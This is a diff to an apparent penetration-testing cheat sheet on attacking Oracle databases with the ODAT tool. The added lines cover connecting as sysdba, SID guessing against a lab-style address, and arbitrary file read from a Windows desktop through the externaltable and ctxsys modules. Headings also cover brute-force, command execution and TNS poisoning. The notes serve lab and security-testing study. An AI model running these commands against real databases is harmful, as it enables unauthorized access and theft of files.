@@ -1,14 +1,18 @@
 # Oracle Databases
 
-Most of the examples here will be utilizing [ODAT ](https://github.com/quentinhardy/odat), the Oracle Database Attacking Tool.  This is because it has a number of exploits and scanners built in, is generally easier to set up and more stable than metasploit, and can use a lot of metasploits wordlists and data.  Follow the guide in the ODAT readme to ensure that your Kali has all the required tools.
+Most of the examples here will be utilizing [ODAT ](https://github.com/quentinhardy/odat), the Oracle Database Attacking Tool.  This is because it has a number of exploits and scanners built in, is generally easier to set up and more stable than metasploit, and can use a lot of metasploits wordlists and data.  However, a lot will be repeated from the [wiki](https://github.com/quentinhardy/odat/wiki), so follow that if you want more in depth information.  Follow the guide in the [ODAT readme](https://github.com/quentinhardy/odat) to ensure that your Kali has all the required tools.    
 
 In general I'd recommend this over trying to get Metasploit up and running.  However, if you are still keen then follow [this guide](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux).  For an alternative, see [Andy Gill's guide](https://blog.zsec.uk/msforacle/).
 
+## Connecting to the Database
+
+Assuming a remote TNS listener on port 1521, we can connect to a remote database as follows:
+
 ```
-/usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL  as sysdba
+/usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL
 ```
 
-Alternatively pass the `--sysdba` flag to odat when logging in:
+It's worth adding the `as sysdba` appended to the above command as your user may already be a database administrator, but the option to connect as one has to be explicitly set.  Alternatively pass the `--sysdba` flag to odat when logging in:
 
 ```
 ./odat.py all -s 192.168.0.5 -d ORCL -U username -P password --sysdba
@@ -16,7 +20,11 @@ Alternatively pass the `--sysdba` flag to odat when logging in:
 
 ## SID Enumeration
 
-The SID for Oracle identifies the database instance running.  We can use ODAT to enumerate these SID's and find instances to attack.
+The SID for Oracle identifies the database instance running.  We can use ODAT to enumerate these SID's and find instances to attack.  These have to be explicity set in the command so it's important that you verify any one's available.
+
+```
+./odat.py sidguesser  -s 10.10.10.82
+```
 
 ## Username Brute-force
 
@@ -45,6 +53,18 @@ We can use dbmsscheduler in odat to execute arbitrary commands, however the resu
 ```
 
 ## Arbitrary File Read
+
+I've found the `externaltable` to give the best results in cases like these:
+
+```
+./odat.py externaltable --getFile C:\\Users\\Booj\\Desktop evil.jpg evil.jpg -s 192.168.0.5 -d ORCL -U username -P password --sysdba
+```
+
+However, do note that `ctxsys` can do the same, but all results are transformed to a single case:
+
+```
+./odat.py ctxsys --getFile 'C:\\Users\\Booj\\Desktop\\evil.jpg' -s 192.168.0.5 -d ORCL -U username -P password--sysdba
+```
 
 ## TNS Poisoning
 
